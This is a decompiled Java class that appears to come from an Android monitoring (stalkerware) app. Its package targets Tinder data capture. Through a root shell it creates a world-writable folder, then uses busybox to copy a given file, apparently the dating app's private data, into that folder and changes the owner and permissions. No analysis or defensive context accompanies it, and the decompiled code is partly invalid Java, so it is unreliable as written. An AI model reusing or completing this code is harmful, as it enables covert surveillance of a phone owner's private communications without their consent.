package com.vvt.capture.tinder.b;

import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.io.File;

public class c
{
  private static final String a = c.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static String a()
  {
    return com.vvt.n.a.f.a.a();
  }
  
  public static String a(String paramString)
  {
    return p.a(paramString, "tinder");
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    String str1 = null;
    bool = ShellUtil.b(paramString1);
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject1 = new java/io/File;
        ((File)localObject1).<init>(paramString1);
        localObject1 = ((File)localObject1).getName();
        Object localObject2 = a(paramString2);
        str1 = p.a((String)localObject2, (String)localObject1);
        localObject1 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        int i = 5;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str2 = null;
        arrayOfObject[0] = localObject2;
        j = 1;
        arrayOfObject[j] = localObject2;
        j = 2;
        arrayOfObject[j] = paramString3;
        j = 3;
        arrayOfObject[j] = paramString3;
        j = 4;
        arrayOfObject[j] = localObject2;
        localObject1 = String.format((String)localObject1, arrayOfObject);
        KMShell.a((String)localObject1);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k((String)localObject2);
        }
        localObject1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        localObject2 = new Object[k];
        i = 0;
        arrayOfObject = null;
        str2 = b(paramString2);
        localObject2[0] = str2;
        i = 1;
        localObject2[i] = paramString1;
        i = 2;
        localObject2[i] = str1;
        i = 3;
        localObject2[i] = str1;
        i = 4;
        localObject2[i] = paramString3;
        i = 5;
        localObject2[i] = paramString3;
        i = 6;
        localObject2[i] = str1;
        localObject1 = String.format((String)localObject1, (Object[])localObject2);
        KMShell.a((String)localObject1);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(str1);
        }
        bool = b;
        if (!bool) {}
      }
      catch (Exception localException)
      {
        bool = c;
        if (!bool) {
          continue;
        }
        continue;
      }
      return str1;
      bool = b;
      if (!bool) {}
    }
  }
  
  public static String b(String paramString)
  {
    return p.a(paramString, "busybox");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/tinder/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */